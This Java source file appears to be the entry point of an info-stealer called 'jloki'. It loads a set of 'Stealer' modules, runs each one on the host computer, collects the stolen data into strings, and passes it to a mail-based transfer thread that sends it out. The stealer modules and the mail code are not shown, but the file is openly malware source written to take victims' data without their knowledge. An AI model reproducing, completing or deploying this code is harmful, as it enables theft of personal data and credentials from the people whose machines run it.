package me.jershdervis.jloki;

import me.jershdervis.jloki.mail.TransferData;
import me.jershdervis.jloki.steal.Stealer;
import me.jershdervis.jloki.steal.StealerManager;

import java.util.ArrayList;

/**
 * Created by JershDervis on 28/07/2015.
 */
public class Main {

    private static Main instance;

    private final StealerManager stealerManager;

    public Main() {
        instance = this;
        stealerManager = new StealerManager();

        this.retrieveComputerData();
    }

    /**
     * Runs the data retrieval methods (Stealers)
     * Filters retrieved data and runs the mail thread
     */
    private void retrieveComputerData() {
        //Initialize data manipulation objects
        ArrayList<String> transferDataArray = new ArrayList<>();
        StringBuilder stringBuilder = new StringBuilder();

        //Loop through the loaded Stealer objects:
        for(Stealer stealer : stealerManager.getStealerArrayList()) {
            //Append the name of the current Stealer object:
            stringBuilder.append(stealer.getName());

            //Retrieve the current Stealer's data in String array:
            String[] currentStealerStolenData = stealer.run();

            //Loop through output data values and append to the StringBuilder with format:
            for(String currentDataValue : currentStealerStolenData)
                stringBuilder.append(":" + currentDataValue);

            //Add the StringBuilder data to the transferDataArray ArrayList:
            transferDataArray.add(stringBuilder.toString());

            //Reset the StringBuilder buffer:
            stringBuilder.setLength(0);
            stringBuilder.trimToSize();
        }
        //Execute the transfer process with filtered data:
        new Thread(new TransferData(transferDataArray)).start();
    }

    /**
     * Return an instance of the current class
     * @return
     */
    public Main getInstance() {
        return instance;
    }

    /**
     * Return an initialized instance of the StealerManager class
     * @return
     */
    public StealerManager getStealerManager() {
        return this.stealerManager;
    }

    /**
     * Program entry point
     * @param args
     */
    public static void main(String[] args) {
        new Main();
    }
}
